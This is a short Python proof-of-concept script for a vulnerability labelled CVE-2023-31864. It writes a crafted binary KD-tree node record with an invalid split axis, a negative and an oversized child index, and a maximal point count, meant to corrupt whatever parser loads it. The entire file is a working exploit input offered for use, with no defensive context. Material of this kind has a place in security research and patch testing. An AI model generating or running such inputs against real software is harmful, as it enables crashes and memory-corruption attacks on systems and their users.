#!/usr/bin/env python3
"""CVE-2023-31864 — KD-tree corruption. Malformed node record with an
out-of-bounds child index and a poisoned split axis."""
import struct, sys
from pathlib import Path

def build() -> bytes:
    # [axis:u8][pad:u8][child_l:i32][child_r:i32][split:f64][npoints:u32]
    return (struct.pack("<BB", 0x09, 0x00)
            + struct.pack("<ii", -1, 0x7FFFFFFF)
            + struct.pack("<d", 3.14159265)
            + struct.pack("<I", 0xFFFFFFFF))

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2023-31864.bin")
    data = build(); out.write_bytes(data)
    print(f"[+] CVE-2023-31864 KD-tree node -> {out} ({len(data)} bytes)")

if __name__ == "__main__":
    main()
